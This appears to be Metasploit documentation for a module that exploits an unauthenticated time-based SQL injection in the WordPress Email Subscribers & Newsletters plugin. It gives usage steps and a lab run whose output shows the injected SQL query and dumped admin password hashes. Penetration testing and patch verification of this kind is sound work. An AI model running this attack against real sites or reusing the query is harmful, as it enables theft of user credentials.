## Vulnerable Application

Email Subscribers & Newsletters plugin contains an unauthenticated timebased SQL injection in
versions before 4.3.1.  The `hash` parameter is vulnerable to injection.

All versions can be downloaded from [wordress.org](https://wordpress.org/plugins/email-subscribers/advanced/)
or [4.2.2](https://downloads.wordpress.org/plugin/email-subscribers.4.2.2.zip)

After install, simply activate the plug-in.  You may get a "80% done!" page, simply ignore it.

## Verification Steps

1. Install the plugin on wordpress.
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_email_sub_news_sqli`
1. Do: `set rhosts [ip]`
1. Do: `set action [action]`
1. Do: `run`

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

### COUNT

If Action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `1`.

## Scenarios

### Wordpress 5.4.2 with Email Subscribers & Newsletters 4.2.2 on Ubuntu 20.04 using MariaDB 10.3.22

#### List Users

```
msf6 > use auxiliary/scanner/http/wp_email_sub_news_sqli 
msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > set rhosts 2.2.2.2
rhosts => 2.2.2.2
msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > set count 3
count => 3
msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > run

[*] Checking /wp-content/plugins/email-subscribers/readme.txt
[*] Found version 4.2.2 in the plugin
[+] Vulnerable version detected
[*] {SQLi} Executing (select group_concat(yKaoA) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) yKaoA from wp_users limit 3) adO)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
